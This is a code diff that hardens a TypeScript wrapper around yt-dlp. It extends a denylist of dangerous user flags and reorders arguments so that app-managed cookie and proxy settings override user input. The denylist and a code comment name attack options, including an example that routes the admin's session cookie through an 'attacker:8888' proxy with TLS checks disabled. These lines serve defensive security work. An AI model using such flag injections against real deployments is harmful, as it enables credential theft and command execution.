@@ -53,6 +53,12 @@ export class YtdlpService {
 		'--download-archive', // read/append arbitrary archive files
 		'--sponsorblock-api', // arbitrary URL fetched server-side (SSRF)
 		'--add-headers', // inject arbitrary request headers (auth/cookies)
+		// --no-check-certificate (youtube-dl spelling) is an unambiguous
+		// abbreviation of --no-check-certificates, so one entry covers both.
+		'--no-check-certificates', // disable TLS validation (MITM of the session cookie)
+		'--proxy', // reroute the request — and the --cookies session — to an attacker host
+		'--netrc-cmd', // execute an arbitrary command to obtain credentials
+		'--parse-metadata', // can set additional_urls, making yt-dlp fetch an attacker-chosen URL
 	];
 	// -o: --output, -P: --paths, -a: --batch-file
 	private dangerousShortFlags = new Set(['-o', '-P', '-a']);
@@ -155,81 +161,9 @@ export class YtdlpService {
 		}
 	}
 
-	/**
-	 * Fetch channel/playlist name from a URL. Best-effort: resolves null on
-	 * failure (with the classified reason logged) so callers can fall back.
-	 */
-	async fetchChannelName(
-		url: string,
-		defaults?: { proxyUrl?: string | null; extraFlags?: string[] },
-	): Promise<string | null> {
-		this.validateUrl(url);
-		return new Promise((resolve) => {
-			const args = [
-				'--flat-playlist',
-				'--playlist-items',
-				'0',
-				'-J',
-				'--no-warnings',
-				...this.buildDefaultsArgs(defaults ?? {}),
-				url,
-			];
-			const proc = spawn(this.ytdlpPath, args);
-			let output = '';
-			let error = '';
-			let settled = false;
-
-			const timeout = setTimeout(() => {
-				if (settled) return;
-				settled = true;
-				try {
-					proc.kill('SIGKILL');
-				} catch {}
-				resolve(null);
-			}, 60000);
-
-			proc.stdout.on('data', (data) => {
-				output += data.toString();
-			});
-
-			proc.stderr.on('data', (data) => {
-				error += data.toString();
-			});
-
-			proc.on('error', (err) => {
-				if (settled) return;
-				settled = true;
-				clearTimeout(timeout);
-				console.error(`[YtdlpService] Channel name fetch failed for ${url}:`, err.message);
-				resolve(null);
-			});
-
-			proc.on('close', (code) => {
-				if (settled) return;
-				settled = true;
-				clearTimeout(timeout);
-				if (code === 0) {
-					try {
-						const info = JSON.parse(output);
-						const name = info.channel || info.uploader || null;
-						resolve(name);
-					} catch {
-						resolve(null);
-					}
-				} else {
-					const message = this.extractErrorMessage(error, code);
-					console.error(
-						`[YtdlpService] Channel name fetch failed for ${url}:${isRateLimitedError(message) ? ' (rate limited)' : ''} ${message}`,
-					);
-					resolve(null);
-				}
-			});
-		});
-	}
-
 	async fetchChannelThumbnail(
 		channelUrl: string,
-		defaults?: { proxyUrl?: string | null; extraFlags?: string[] },
+		defaults?: { proxyUrl?: string | null; extraFlags?: string[]; cookiePath?: string | null },
 	): Promise<Buffer | null> {
 		this.validateUrl(channelUrl);
 		return new Promise((resolve) => {
@@ -500,15 +434,22 @@ export class YtdlpService {
 	}
 
 	/**
-	 * Args carrying the global yt-dlp defaults (outbound proxy + extra default
-	 * flags) for invocations that don't go through {@link buildArgs}. Extra
-	 * flags are guarded by the same denylist as per-download custom flags.
+	 * Args carrying the per-request yt-dlp defaults (session cookie file, outbound
+	 * proxy + extra default flags) for invocations that don't go through
+	 * {@link buildArgs}. The cookie path is always produced by
+	 * withYouTubeCookies() and validated by its caller, so unlike extra flags it is
+	 * not user input; extra flags are guarded by the same denylist as per-download
+	 * custom flags.
 	 */
 	buildDefaultsArgs(defaults: {
 		proxyUrl?: string | null;
 		extraFlags?: string[] | null;
+		cookiePath?: string | null;
 	}): string[] {
 		const args: string[] = [];
+		if (defaults?.cookiePath) {
+			args.push('--cookies', defaults.cookiePath);
+		}
 		if (defaults?.proxyUrl) {
 			args.push('--proxy', defaults.proxyUrl);
 		}
@@ -583,16 +524,6 @@ export class YtdlpService {
 			args.push('--downloader', 'aria2c', '--downloader-args', 'aria2c:-x16 -s16 -k1M');
 		}
 
-		// Add cookie authentication if configured
-		if (options?.cookiePath) {
-			args.push('--cookies', options.cookiePath);
-		}
-
-		// Route through the configured outbound proxy (SOCKS/HTTP)
-		if (options?.proxyUrl) {
-			args.push('--proxy', options.proxyUrl);
-		}
-
 		// Add custom flags
 		if (customFlags.length > 0) {
 			// Runtime re-check (guards are also enforced at save time, but
@@ -615,6 +546,20 @@ export class YtdlpService {
 				}
 			}
 			args.push(...finalFlags);
+		}
+
+		// App-managed credential/routing flags go LAST (before the kill switches),
+		// AFTER any user custom flags: yt-dlp's option parser keeps the last value
+		// for a repeated option, so pushing --cookies/--proxy earlier let a profile
+		// carrying e.g. `--proxy http://attacker:8888 --no-check-certificates`
+		// silently reroute the admin's cookie file through the attacker. Order is
+		// load-bearing here, not cosmetic — same reason the kill switches below are
+		// appended last.
+		if (options?.cookiePath) {
+			args.push('--cookies', options.cookiePath);
+		}
+		if (options?.proxyUrl) {
+			args.push('--proxy', options.proxyUrl);
 		}
 
 		// Official kill switches, appended AFTER user flags so a dangerous flag
